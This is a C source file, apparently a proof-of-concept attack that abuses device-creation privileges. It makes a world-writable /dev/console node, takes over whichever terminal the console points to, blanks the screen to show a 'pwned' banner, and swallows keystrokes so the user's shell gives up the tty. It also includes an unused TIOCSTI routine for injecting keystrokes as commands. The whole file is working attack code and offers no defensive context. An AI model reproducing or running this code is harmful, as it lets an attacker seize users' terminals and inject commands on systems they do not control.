#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#define CONSOLE_PATH "console"

// Need CAP_SYS_ADMIN
void fake_input(int tty, char* cmd) {
  unsigned int i = 0;
  while(cmd[i]) {
    if(ioctl(tty, TIOCSTI, cmd + i)) {
      perror("ioctl TIOCSTI ");
      // exit(1);
    }
    i ++;
  }
  if(ioctl(tty, TIOCSTI, "\n")) {
    perror("ioctl TIOCSTI ");
    // exit(1);
  }
}

void draw(int tty) {

  char buff[512];

  // Hide cursor
  write(1, "\x1b[?25l",6);
  // Clear screen
  write(1, "\x1b[2J", 4);
  // Set cursor to top
  write(1, "\x1b[H", 3);

  // Draw
  FILE* motif = fopen("pwned.txt", "r");
  while(fgets(buff, 512, motif)) {
    printf("%s\r\n", buff);
  }
  fclose(motif);

  // show cursor
  // write(1, "\x1b[?25h",6);
}

// Set tty attributes
int setAttr(int tty) {
  struct termios raw;

  if(tcgetattr(1, &raw)) {
    perror("tcgetattr ");
    return -1;
  }

  raw.c_iflag &= ~(BRKINT | INPCK |  ISTRIP | IXON | ICRNL);
  raw.c_oflag &= ~(OPOST);
  raw.c_cflag |= (CS8);
  raw.c_lflag &= ~(ECHO | ICANON | ISIG | IEXTEN);
  raw.c_cc[VMIN] = 0;
  raw.c_cc[VTIME] = 1;

  if(tcsetattr(1, TCSANOW, &raw)) {
    perror("tcsetattr ");
  }

  return 0;
}

int main(void) {

  char c;
  int tty;

  // Create device node 5:1 (/dev/console)
  if(mknod(CONSOLE_PATH, S_IFCHR, 5 * 256 + 1)) {
    perror("mknod ");
    return 1;
  }

  if(chmod(CONSOLE_PATH, 00666)) {
    perror("chmod ");
    return 1;
  }

  // To it on a loop, the console device node points on different tty depending on where the user is
  while(1) {

    // Open tty
    tty = open(CONSOLE_PATH, O_RDWR);
    if(tty < 0) {
      perror("open ");
      return 1;
    }

    // Set stdin/stdout/stderr to console tty
    close(0); close(1); close(2);
    dup(tty); dup(tty); dup(tty);

    switch(setAttr(tty)) {
      case -1:
        sleep(1);
        close(tty);
        continue;
      case 0:
        draw(tty);
        int i;
        for(i = 0; i < 10; i ++)
          read(0, &c, 1); // Make bash give up on the tty
    }

    close(tty);
  }

  return 0;
}
